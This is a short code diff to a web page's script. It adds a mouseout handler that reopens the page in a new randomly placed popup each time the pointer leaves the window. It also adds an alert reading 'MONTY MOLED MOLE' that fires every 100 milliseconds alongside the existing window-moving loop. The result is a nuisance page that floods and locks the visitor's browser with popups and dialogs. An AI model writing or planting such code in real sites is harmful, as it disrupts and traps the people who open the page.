@@ -31,7 +31,12 @@
 
     aWindow = window.open(window.location.href, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=500, height=500, titlebar=no, alwaysRaised=no');
     aWindow.moveTo(genRandom(), genRandom());
+    window.onmouseout = function () {
+        aWindow = window.open(window.location.href, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=500, height=500, titlebar=no, alwaysRaised=no');
+        aWindow.moveTo(genRandom(), genRandom());
+    };
     window.setInterval(function(){
         window.moveTo(genRandom(), genRandom());
+        alert("MONTY MOLED MOLE")
     }, 100);
 </script>
